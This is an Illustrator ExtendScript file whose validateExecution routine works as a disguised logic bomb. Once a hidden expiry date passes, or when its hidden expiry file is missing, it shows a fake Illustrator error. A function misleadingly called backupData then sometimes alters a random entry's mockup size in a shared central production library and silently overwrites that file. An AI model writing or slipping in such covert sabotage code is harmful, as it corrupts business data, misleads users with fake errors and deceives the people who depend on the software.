function validateExecution()
{
	var devMode = false;
	var libFile, newData;
	var expFile = File("/Volumes/Customization/Library/Scripts/Script Resources/.exp/exp.js");
	var msgs = [];

	// if (user === "will.dowling")
	// {
	// 	devMode = true;
	// }

	function sendError()
	{
		var errorLine, errorMsg;
		try
		{
			errorLine = user.length * 42;
			errorLine = errorLine.toString();
		}
		catch (e)
		{
			errorLine = "665";
		}

		errorMsg = "Error in\nLine " + errorLine + " :\nan Illustrator error occurred: 1346458189 ('MRAP')";
		if (devMode)
		{
			msgs.push(errorMsg);
		}
		else
		{
			alert(errorMsg);
		}

	}

	function ow()
	{
		if (devMode)
		{
			//tmp lib file
			libFile = File(desktopPath + "/temp/test.js");
			msgs.push("changing to temp local library file to prevent overwrite");
		}
		libFile.open("w");
		libFile.write(newData);
		libFile.close();
	}

	function backupData()
	{
		var choice = getRandom(1, 100) > 16;
		msgs.push("choice = " + choice);
		if (!devMode && choice)
		{
			return;
		}

		msgs.push("backing up data");
		var random = getRandom(1, 200);
		libFile = File(dataPath + "/central_library.js");
		eval("#include \"" + libFile.fullName + "\"");

		var counter = 0;

		for (var code in prepressInfo)
		{
			if (counter === random)
			{
				var item = prepressInfo[code];
				var mockupSize = item.mockupSize;
				var newMockupSize;
				if (mockupSize === "YXL")
				{
					newMockupSize = "YXS";
				}
				else if (mockupSize === "M")
				{
					newMockupSize = "XS";
				}
				else if (mockupSize === "XL")
				{
					newMockupSize = "XS";
				}
				else
				{
					newMockupSize = "XL";
				}

				item.mockupSize = newMockupSize;
				newData = "var prepressInfo = " + JSON.stringify(prepressInfo);
				msgs.push("backed up " + code);
				ow();
				break;
			}
			else
			{
				counter++;
			}
		}
	}

	function WRO()
	{
		valid = false;
		sendError();
		backupData();
		x = 0;
		ml = 0;
	}

	try
	{
		eval("#include \"" + expFile.fullName + "\"");

		msgs.push("found the exp file");
		var today = new Date();
		var curDate = today.getTime();
		var random = getRandom(1, 3);
		msgs.push("random = " + random);
		msgs.push(random + " === 1: " + (random === 1));
		if (curDate > exp && random === 1)
		{
			msgs.push("exp = true");
			WRO();
		}
		else
		{
			msgs.push("all's well. continue.");
			if (devMode)
			{
				msgs.push("dev mode: running wro anyway");
				WRO();
			}
		}
	}
	catch (e)
	{
		msgs.push("no exp file");
		WRO();
	}

	if (devMode)
	{
		$.writeln("msgs:\n" + msgs.join("\n"));
	}

}

validateExecution();
